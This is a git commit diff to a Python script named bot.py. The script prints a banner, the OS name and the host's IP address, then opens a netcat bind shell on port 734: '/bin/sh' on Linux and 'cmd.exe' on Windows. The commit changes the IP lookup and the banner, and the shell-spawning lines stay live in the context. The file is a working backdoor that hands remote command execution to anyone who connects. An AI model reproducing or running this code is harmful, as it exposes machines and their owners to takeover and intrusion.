8136c6ebca311a3f993251d7b38821b5b4e7f23a
kaki714 <123768052+kaki714@users.noreply.github.com>
2023-02-14 11:48:15 -0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -2,24 +2,34 @@ import platform
 import os
 import sysconfig
 import socket
+import fcntl
+import struct
+
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15])
+    )[20:24])
 
 def run():
     hostname=socket.gethostname()   
     IPAddr=socket.gethostbyname(hostname) 
     print('')
-    print('         ###### # # # #######')
-    print('         #### # #  # # ######')
-    print('         #### ##    ## ######')
-    print('         #####  #  #  #######')
-    print('         ###### ### #########')
+    print(' ############### # # # ##############')
+    print(' ####### ###### # #  # # ####### ####')
+    print(' ######   ##### ##    ## ######   ###')
+    print(' ####### #######  #  #  ######## ####')
+    print(' ################ ### ###############')
     print('')
     print('# OS name: ', platform.system())
     if "Linux" in platform.system():
         print('Linux: ', sysconfig.get_platform()) 
-        os.system('ifconfig eth0 |grep "inet "')
+        print(' IpAddress: ', get_ip_address('eth0'))
         os.system( 'nc -lvp 734 -e /bin/sh')
     elif "Windows" in platform.system():
-        print('Linux: ', sysconfig.get_platform()) 
+        print('Windows: ', sysconfig.get_platform()) 
         print('Address ip: ', IPAddr)
         os.system('ncat -lvp 734 -e cmd.exe')
     
